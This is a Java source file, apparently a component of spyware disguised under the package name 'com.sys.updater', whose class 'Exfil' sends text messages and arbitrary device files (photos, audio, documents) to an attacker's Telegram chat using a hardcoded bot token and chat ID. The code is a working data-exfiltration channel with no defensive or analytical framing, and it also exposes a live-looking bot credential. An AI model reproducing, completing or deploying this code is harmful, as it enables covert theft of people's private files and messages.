package com.sys.updater;

import org.json.JSONObject;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class Exfil {
    public static final String BOT_TOKEN = "8624726401:AAF0OfA_I0vxNPkeEucmLFCU6CBff7ynbUk"; // <--- BEDEL
    public static final String CHAT_ID = "8431994335"; // <--- BEDEL

    // 1. Send normal text
    public static void send(String text) {
        new Thread(() -> {
            try {
                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                String postData = "chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=HTML";
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(postData.getBytes());
                }
                conn.getInputStream().close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    // 2. Send text with Inline Keyboard
    public static void sendWithMarkup(String text, String jsonMarkup) {
        new Thread(() -> {
            try {
                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                String postData = "chat_id=" + CHAT_ID + 
                                  "&text=" + URLEncoder.encode(text, "UTF-8") + 
                                  "&parse_mode=HTML" +
                                  "&reply_markup=" + URLEncoder.encode(jsonMarkup, "UTF-8");
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(postData.getBytes());
                }
                conn.getInputStream().close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    // 3. Answer Callback (to remove loading icon on button)
    public static void answerCallback(String callbackId, String text) {
        new Thread(() -> {
            try {
                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/answerCallbackQuery";
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                String postData = "callback_query_id=" + callbackId + "&text=" + URLEncoder.encode(text, "UTF-8");
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(postData.getBytes());
                }
                conn.getInputStream().close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }
    
    // 4. Send File (Photo, Audio, Document)
    public static void sendFile(String filePath, String type, String caption) {
        new Thread(() -> {
            try {
                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/send" + type;
                String boundary = "*****";
                File file = new File(filePath);
                HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                dos.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n");
                if (caption != null && !caption.isEmpty()) {
                    dos.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n");
                }
                String fieldName = type.equals("Photo") ? "photo" : (type.equals("Audio") ? "audio" : "document");
                dos.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"" + fieldName + "\";filename=\"" + file.getName() + "\"\r\n\r\n");
                
                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) dos.write(buffer, 0, bytesRead);
                fis.close();
                dos.writeBytes("\r\n--" + boundary + "--\r\n");
                dos.flush(); dos.close();
                conn.getInputStream().close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }
                }
